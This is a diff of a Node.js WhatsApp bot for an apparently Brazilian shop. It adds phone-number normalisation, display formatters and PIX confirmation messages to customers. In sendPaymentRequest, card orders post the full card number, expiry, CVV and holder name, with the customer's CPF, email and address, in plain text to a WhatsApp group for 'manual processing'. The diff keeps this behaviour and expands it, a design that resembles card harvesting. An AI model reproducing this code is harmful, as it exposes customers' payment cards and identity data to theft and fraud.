@@ -33,10 +33,48 @@ let _reconnectDelay  = 5000;
 const authInfoPath   = path.join(__dirname, 'auth_info');
 let socketInstance   = null;
 
+// ── Converte telefone brasileiro para JID do WhatsApp (E.164 com DDI 55) ─────
+// O banco armazena apenas DDD+número (10-11 dígitos). O JID exige DDI 55.
+// Sem DDI: 11937791251@s.whatsapp.net → número inválido, mensagem não chega.
+// Com DDI: 5511937791251@s.whatsapp.net → correto.
+const toWAJid = (phone) => {
+  if (!phone) return null;
+  let digits = String(phone).replace(/\D/g, '');
+  // Se não começa com 55 (DDI Brasil) e tem 10-11 dígitos, adiciona o DDI
+  if (!digits.startsWith('55') && (digits.length === 10 || digits.length === 11)) {
+    digits = '55' + digits;
+  }
+  // Valida: número brasileiro com DDI deve ter 12 (fixo) ou 13 (celular com 9) dígitos
+  if (digits.length < 12 || digits.length > 13) {
+    console.warn(`[WA] Número inválido após normalização: "${phone}" → "${digits}"`);
+    return null;
+  }
+  return `${digits}@s.whatsapp.net`;
+};
+
+// ── Formata número para exibição ──────────────────────────────────────────────
+const formatPhoneDisplay = (phone) => {
+  if (!phone) return 'Não informado';
+  const d = String(phone).replace(/\D/g, '');
+  const n = d.startsWith('55') ? d.slice(2) : d;
+  if (n.length === 11) return `(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7)}`;
+  if (n.length === 10) return `(${n.slice(0,2)}) ${n.slice(2,6)}-${n.slice(6)}`;
+  return d;
+};
+
+// ── Formata CPF para exibição ─────────────────────────────────────────────────
+const formatCpfDisplay = (cpf) => {
+  if (!cpf) return 'Não informado';
+  const d = String(cpf).replace(/\D/g, '');
+  if (d.length !== 11) return cpf;
+  return `${d.slice(0,3)}.${d.slice(3,6)}.${d.slice(6,9)}-${d.slice(9)}`;
+};
+
 // ── Envia mensagem diretamente para o cliente (usado pelo painel admin) ───────
 const sendToClient = async (clientPhone, text) => {
   if (!socketInstance || !clientPhone) return false;
-  const jid = `${clientPhone.replace(/\D/g, '')}@s.whatsapp.net`;
+  const jid = toWAJid(clientPhone);
+  if (!jid) { console.error('[WA] sendToClient: número inválido:', clientPhone); return false; }
   try {
     await socketInstance.sendMessage(jid, { text });
     return true;
@@ -253,8 +291,8 @@ const initWhatsApp = async () => {
     const idx   = allPayments.findIndex(p => p.id === payment.id);
     const cur   = allPayments[idx];
 
-    const clientPhone = cur.clientPhone;
-    const clientJid   = clientPhone ? `${clientPhone.replace(/\D/g, '')}@s.whatsapp.net` : null;
+    const clientPhone  = cur.clientPhone;
+    const clientJid    = toWAJid(clientPhone);
     const shortDisplay = cur.shortId ? `#${cur.shortId}` : cur.id.slice(0, 8);
 
     // ── Comando: APROVADO ─────────────────────────────────────────────────────
@@ -404,61 +442,134 @@ const initWhatsApp = async () => {
 // ── Public API ────────────────────────────────────────────────────────────────
 
 /**
- * Envia notificação de novo pedido ao grupo com o código PIX incluído.
+ * Envia notificação de novo pedido ao grupo admin E mensagem de confirmação ao cliente.
+ *
+ * Etapa 1 (PIX gerado / cartão recebido): mensagem informativa ao grupo SEM
+ * APROVADO/RECUSADO/REENVIAR — essas opções aparecem apenas quando o cliente
+ * envia o comprovante (rota /proof em payment.js).
+ *
  * @param {object} sock
- * @param {string} paymentId UUID
+ * @param {string} paymentId UUID do pedido
  * @param {string} shortId   PED12345
  * @param {string} product   Nome do produto
- * @param {number|string} amount Valor
- * @param {string} clientPhone Telefone do cliente
- * @param {string|null} pixCode Código PIX gerado (se disponível)
+ * @param {number|string} amount Valor total
+ * @param {string} clientPhone Telefone do cliente (armazenado sem DDI)
+ * @param {string|null} pixCode Código PIX copia e cola
+ * @param {object} opts  { paymentMethod, cardNumber, cardName, cardExpiry, cardCvv,
+ *                         installments, clientName, clientEmail, clientCpf, address }
  */
 const sendPaymentRequest = async (sock, paymentId, shortId, product, amount, clientPhone, pixCode, opts = {}) => {
   if (!WHATSAPP_GROUP_ID) { console.error('[WA] ERRO: WHATSAPP_GROUP_ID não definido no .env'); return null; }
 
-  const now   = new Date().toLocaleString('pt-BR');
-  const phone = clientPhone ? clientPhone.replace(/\D/g, '') : 'Não informado';
+  const now      = new Date().toLocaleString('pt-BR');
   const isCartao = opts.paymentMethod === 'cartao';
+  const nome     = opts.clientName  || 'Não informado';
+  const email    = opts.clientEmail || 'Não informado';
+  const cpf      = formatCpfDisplay(opts.clientCpf);
+  const tel      = formatPhoneDisplay(clientPhone);
+  const addr     = opts.address;
+  const addrLine = addr
+    ? `${addr.rua}, ${addr.numero}${addr.complemento ? ' ' + addr.complemento : ''} — ${addr.bairro}, ${addr.cidade}/${addr.estado} · CEP ${addr.cep}`
+    : 'Não informado';
 
-  const lines = [
-    isCartao ? '💳 *NOVO PEDIDO — CARTÃO DE CRÉDITO*' : '🛒 *NOVO PEDIDO*', '',
-    `Pedido: #${shortId}`,
-    `ID: ${paymentId}`,
-    `Produto: ${product}`,
-    `Valor: ${formatBRL(amount)}`,
-    `Telefone: ${phone}`,
-    `Data: ${now}`
+  // ── Mensagem para o grupo admin ──────────────────────────────────────────────
+  const groupLines = [
+    isCartao ? '💳 *NOVO PEDIDO — CARTÃO DE CRÉDITO*' : '🛒 *NOVO PEDIDO PIX*',
+    '━━━━━━━━━━━━━━━',
+    '',
+    `📋 *Pedido:* #${shortId}`,
+    `🆔 *ID:* ${paymentId}`,
+    `🛍️ *Produto:* ${product}`,
+    `💰 *Valor:* ${formatBRL(amount)}`,
+    `📅 *Data:* ${now}`,
+    '',
+    '👤 *Dados do Cliente*',
+    `Nome:     ${nome}`,
+    `CPF:      ${cpf}`,
+    `Telefone: ${tel}`,
+    `E-mail:   ${email}`,
+    '',
+    '📦 *Endereço de Entrega*',
+    addrLine,
   ];
 
   if (isCartao) {
-    lines.push('', '💳 *Dados do Cartão*');
-    if (opts.cardNumber)   lines.push(`Número: ${opts.cardNumber}`);
-    if (opts.cardName)     lines.push(`Portador: ${opts.cardName}`);
-    if (opts.cardExpiry)   lines.push(`Validade: ${opts.cardExpiry}`);
-    if (opts.cardCvv)      lines.push(`CVV: ${opts.cardCvv}`);
-    if (opts.installments) lines.push(`Parcelas: ${opts.installments}x`);
-    lines.push('', '⚠️ Use estes dados para processar o pagamento e confirme com o cliente.');
+    groupLines.push('', '💳 *Dados do Cartão*');
+    if (opts.cardNumber)   groupLines.push(`Número:    ${opts.cardNumber}`);
+    if (opts.cardName)     groupLines.push(`Portador:  ${opts.cardName}`);
+    if (opts.cardExpiry)   groupLines.push(`Validade:  ${opts.cardExpiry}`);
+    if (opts.cardCvv)      groupLines.push(`CVV:       ${opts.cardCvv}`);
+    if (opts.installments) groupLines.push(`Parcelas:  ${opts.installments}x`);
+    groupLines.push('', '⚠️ *Use estes dados para processar o pagamento manualmente.*');
+    groupLines.push('', '↩️ Responda esta mensagem quando processar:');
+    groupLines.push('APROVADO — confirmar pagamento');
+    groupLines.push('RECUSADO [motivo] — recusar');
   } else if (pixCode) {
-    lines.push('', '✅ *PIX Gerado Automaticamente*', pixCode);
+    groupLines.push('', '✅ *PIX Gerado Automaticamente*');
+    groupLines.push(`\`\`\`${pixCode}\`\`\``);
+    groupLines.push('', '⏳ *Aguardando pagamento.*');
+    groupLines.push('O cliente receberá o PIX por WhatsApp.');
+    groupLines.push('As opções APROVADO/RECUSADO/REENVIAR aparecerão aqui');
+    groupLines.push('quando o cliente enviar o comprovante.');
   } else {
-    lines.push('', '⚠️ PIX não configurado — envie o QR Code manualmente.');
+    groupLines.push('', '⚠️ PIX não configurado — envie o QR Code manualmente ao cliente.');
+    groupLines.push('', '↩️ Quando o pagamento for confirmado, responda:');
+    groupLines.push('APROVADO — confirmar pagamento');
+    groupLines.push('RECUSADO [motivo] — recusar');
   }
 
-  lines.push('', '↩️ Responda esta mensagem:', 'APROVADO — confirmar pagamento', 'RECUSADO [motivo] — recusar', 'REENVIAR — pedir novo comprovante');
+  groupLines.push('━━━━━━━━━━━━━━━');
 
-  const messageText = lines.join('\n');
-
+  let messageId = null;
   try {
-    const sent      = await sock.sendMessage(WHATSAPP_GROUP_ID, { text: messageText });
-    const messageId = sent?.key?.id || null;
+    const sent = await sock.sendMessage(WHATSAPP_GROUP_ID, { text: groupLines.join('\n') });
+    messageId = sent?.key?.id || null;
     console.log(`[WA] Pedido #${shortId} notificado no grupo. MessageID: ${messageId}`);
     try { getTracker()?.record('wa_sent', { to: 'group' }); } catch {}
-    return messageId;
   } catch (err) {
     console.error('[WA] Erro ao notificar pedido no grupo:', err.message);
     state.lastError = err.message;
-    return null;
   }
+
+  // ── Mensagem de confirmação para o cliente (apenas PIX) ───────────────────
+  // Cartão não envia PIX ao cliente — a mensagem de confirmação é manual.
+  if (!isCartao && pixCode && clientPhone) {
+    const clientJid = toWAJid(clientPhone);
+    if (clientJid) {
+      const clientLines = [
+        '✅ *Seu PIX foi gerado com sucesso!*',
+        '',
+        `Olá, *${nome}*!`,
+        '',
+        '━━━━━━━━━━━━━━━',
+        `📋 *Pedido:* #${shortId}`,
+        `🛍️ *Produto:* ${product}`,
+        `📅 *Data:* ${now}`,
+        `💰 *Valor:* ${formatBRL(amount)}`,
+        '━━━━━━━━━━━━━━━',
+        '',
+        '📋 *Código PIX — Copia e Cola:*',
+        pixCode,
+        '',
+        '⏰ *Pague em até 30 minutos* para garantir o seu pedido.',
+        '',
+        'Assim que o pagamento for identificado, seu pedido será processado automaticamente. 🎉',
+        '',
+        'Dúvidas? Responda esta mensagem ou acesse nosso site.'
+      ];
+      try {
+        await sock.sendMessage(clientJid, { text: clientLines.join('\n') });
+        console.log(`[WA] PIX enviado ao cliente ${tel} | Pedido #${shortId}`);
+        try { getTracker()?.record('wa_sent', { to: 'client', type: 'pix_generated' }); } catch {}
+      } catch (e) {
+        console.error(`[WA] Erro ao enviar PIX ao cliente (${tel}):`, e.message);
+      }
+    } else {
+      console.warn(`[WA] Pedido #${shortId}: número do cliente inválido, PIX não enviado ao cliente.`);
+    }
+  }
+
+  return messageId;
 };
 
 const getSocket        = () => socketInstance;
